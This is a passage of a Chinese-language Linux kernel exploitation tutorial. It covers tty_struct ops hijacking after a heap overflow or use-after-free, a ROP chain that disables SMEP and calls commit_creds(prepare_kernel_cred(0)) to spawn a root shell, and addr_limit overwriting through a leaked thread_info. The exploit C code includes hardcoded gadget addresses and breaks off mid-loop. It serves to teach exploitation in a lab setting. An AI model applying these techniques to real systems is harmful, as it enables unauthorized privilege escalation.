原理](https://blog.csdn.net/lukuen/article/details/6935068)
##### 代码执行
对于堆溢出和 `UAF` 漏洞，其实利用思路都差不多，就是想办法修改一些对象的数据，来达到提权的目的，比如改函数表指针然后执行代码提权， 修改 `cred`
结构体直接提权等。
这里介绍通过修改 `tty_struct` 中的 `ops` 来进行 `rop` 绕过 `smep` 提权的技术。
结构体定义在 `linux/tty.h`
    struct tty_struct {
            int     magic;
            struct kref kref;
            struct device *dev;
            struct tty_driver *driver;
            const struct tty_operations *ops;
            int index;
            /* Protects ldisc changes: Lock tty not pty */
            struct ld_semaphore ldisc_sem;
            struct tty_ldisc *ldisc;
            struct mutex atomic_write_lock;
            struct mutex legacy_mutex;
其中有一个 `ops` 项（`64bit` 下位于 结构体偏移 `0x18` 处）是一个 `struct tty_operations *` 结构体。
它里面都是一些函数指针，用户态可以通过一些函数触发这些函数的调用。
当 `open("/dev/ptmx",O_RDWR|O_NOCTTY)` 内核会分配 `tty_struct` 结构体，`64` 位下改结构体的大小为
`0x2e0`（可以自己编译一个同版本的内核，然后在 `gdb` 里面看），所以实现代码执行的思路就很简单了
  * 通过 `ioctl` 让驱动分配若干个 `0x2e0` 的 内存块
  * 释放其中的几个，然后调用若干次 `open("/dev/ptmx",O_RDWR|O_NOCTTY)` ，会分配若干个 `tty_struct` , 这时其中的一些 `tty_struct` 会落在 刚刚释放的那些内存块里面
  * 利用 驱动中 的 `uaf` 或者 溢出，修改 修改 `tty_struct` 的 `ops` 到我们 `mmap` 的一块空间，进行 `tty_operations` 的伪造， 伪造 `ops->ioctl` 为 要跳转的位置。
  * 然后 对 `/dev/ptmx` 的文件描述符，进行 `ioctl` ，实现代码执行
##### rop
因为开启了 `smep` 所以需要先 使用 `rop` 关闭 `smep`, 然后在 执行
`commit_creds(prepare_kernel_cred(0))` 完成提权。
这里有一个小 `tips` ，通过 `tty_struct` 执行 `ioctl` 时， `rax` 的值正好是 `rip` 的值，然后使用 `xchg
eax,esp;ret` 就可以把 `rsp` 设置为 `rax&0xffffffff` （其实就是 `&ops->ioctl` 的低四个字节）。
于是 堆漏洞的 `rop` 思路如下(假设 `xchg_eax_esp` 为 `xchg eax,esp` 指令的地址 )
  * 首先使用 `mmap`， 分配 `xchg_eax_esp&0xffffffff` 作为 `fake_stack` 并在这里布置好 `rop` 链
  * 修改 `ops->ioctl` 为 `xchg_eax_esp`
  * 触发 `ops->ioctl` ， 然后会跳转到 `xchg_eax_esp` ，此时 `rax=rip=xchg_eax_esp` , 执行 `xchg eax,esp` 后 rsp为 `xchg_eax_esp&0xffffffff`， 之后就是 根据 事先布置好的 `rop chain` 进行 `rop` 了。
    #include 
    #include 
    #include 
    #include 
    struct tty_operations {
        struct tty_struct * (*lookup)(struct tty_driver *driver,
        struct file *filp, int idx);
        int (*install)(struct tty_driver *driver, struct tty_struct *tty);
        void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
        int (*open)(struct tty_struct * tty, struct file * filp);
        void (*close)(struct tty_struct * tty, struct file * filp);
        void (*shutdown)(struct tty_struct *tty);
        void (*cleanup)(struct tty_struct *tty);
        int (*write)(struct tty_struct * tty,
        const unsigned char *buf, int count);
        int (*put_char)(struct tty_struct *tty, unsigned char ch);
        void (*flush_chars)(struct tty_struct *tty);
        int (*write_room)(struct tty_struct *tty);
        int (*chars_in_buffer)(struct tty_struct *tty);
        int (*ioctl)(struct tty_struct *tty,
        unsigned int cmd, unsigned long arg);
        long (*compat_ioctl)(struct tty_struct *tty,
        unsigned int cmd, unsigned long arg);
        void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
        void (*throttle)(struct tty_struct * tty);
        void (*unthrottle)(struct tty_struct * tty);
        void (*stop)(struct tty_struct *tty);
        void (*start)(struct tty_struct *tty);
        void (*hangup)(struct tty_struct *tty);
        int (*break_ctl)(struct tty_struct *tty, int state);
        void (*flush_buffer)(struct tty_struct *tty);
        void (*set_ldisc)(struct tty_struct *tty);
        void (*wait_until_sent)(struct tty_struct *tty, int timeout);
        void (*send_xchar)(struct tty_struct *tty, char ch);
        int (*tiocmget)(struct tty_struct *tty);
        int (*tiocmset)(struct tty_struct *tty,
        unsigned int set, unsigned int clear);
        int (*resize)(struct tty_struct *tty, struct winsize *ws);
        int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
        int (*get_icount)(struct tty_struct *tty,
        struct serial_icounter_struct *icount);
        const struct file_operations *proc_fops;
    };
    struct param
    {
        size_t len;
        char* buf;
        unsigned long idx;
    };
    typedef int __attribute__((regparm(3)))(*_commit_creds)(unsigned long cred);
    typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);
    // 两个函数的地址
    _commit_creds commit_creds = (_commit_creds) 0xffffffff810a1420;
    _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred) 0xffffffff810a1810;
    unsigned long xchg_eax_esp = 0xFFFFFFFF81007808;
    unsigned long rdi_to_cr4 = 0xFFFFFFFF810635B4; // mov cr4, rdi ;pop rbp ; ret
    unsigned long pop_rdi_ret = 0xFFFFFFFF813E7D6F;
    unsigned long iretq = 0xffffffff814e35ef;
    unsigned long swapgs = 0xFFFFFFFF81063694;  // swapgs ; pop rbp ; ret
    unsigned long poprbpret = 0xffffffff8100202b;  //pop rbp, ret
    void get_shell() {
        system("/bin/sh");
    }
    void get_root() {
        commit_creds(prepare_kernel_cred(0));
    }
    /* status */
    unsigned long user_cs, user_ss, user_rflags;
    void save_stats() {
        asm(
            "movq %%cs, %0\n" // mov rcx, cs
            "movq %%ss, %1\n" // mov rdx, ss
            "pushfq\n"        // 把rflags的值压栈
            "popq %2\n"       // pop rax
            :"=r"(user_cs), "=r"(user_ss), "=r"(user_rflags) : : "memory" // mov user_cs, rcx; mov user_ss, rdx; mov user_flags, rax
            );
    }
    int main(void)
    {
        int fds[10];
        int ptmx_fds[0x100];
        char buf[8];
        int fd;
        unsigned long mmap_base = xchg_eax_esp & 0xffffffff;
        struct tty_operations *fake_tty_operations = (struct tty_operations *)malloc(sizeof(struct tty_operations));
        memset(fake_tty_operations, 0, sizeof(struct tty_operations));
        fake_tty_operations->ioctl = (unsigned long) xchg_eax_esp; // 设置tty的ioctl操作为栈转移指令
        fake_tty_operations->close = (unsigned long)xchg_eax_esp;
        for (int i = 0; i addr_limit
### DEMO
这里使用的代码就是 **内核模块创建与调试** 中的示例代码。
代码中大部分都是用来测试一些内核函数，其中对本节内容有效的代码为：
    long arw_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
    {
        .....................
        .....................
        .....................
        switch (cmd) {
            .....................
            .....................
            .....................
            case 5:
                p_arg = (struct param*)arg;
                p_stack = (long)&retval;
                p_stack = p_stack&0xFFFFFFFFFFFFC000;
                info = (struct thread_info * )p_stack;
                printk("addr_limit's addr: 0x%p\n", &info->addr_limit);
                memset(&info->addr_limit, 0xff, 0x8);
                // 返回 thread_info 的地址， 模拟信息泄露
                put_user(info, &p_arg->addr);
                break;
#### 利用栈地址拿到 thread_info 的地址
首先模拟了一个内核的信息泄露。
利用 程序的局部变量的地址 （`&retval`） 获得内核栈的地址。又因为 `thread_info` 位于内核栈顶部而且是 `8k` （或者 `4k`
） 对齐的
    union thread_union {
          struct thread_info thread_info;
          unsigned long stack[THREAD_SIZE/sizeof(long)];
    };
所以利用 **栈地址 & (~(THREAD_SIZE - 1))** 就可以计算出 `thread_info` 的地址。
`THREAD_SIZE` 可以为 `4k`, `8k` 或者是 `16k` 。
可以在 [Linux 源代码](https://elixir.bootlin.com/linux/v4.4.73/ident/THREAD_SIZE)
里面搜索。
x86_64 定义在